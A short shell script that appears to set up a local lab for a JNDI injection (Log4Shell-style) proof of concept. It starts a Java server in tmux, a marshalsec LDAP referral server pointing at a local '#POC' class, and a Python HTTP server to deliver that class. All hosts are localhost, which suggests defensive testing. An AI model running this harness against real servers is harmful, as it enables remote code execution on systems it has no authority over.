#!/bin/sh

tmux new-session -d "cd ~/server; java -jar server.jar --nogui" \; \
     split-window -v "java -cp ~/marshalsec.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#POC" \; \
     split-window -h "cd ~/poc; python3 -m http.server" \; \
     attach
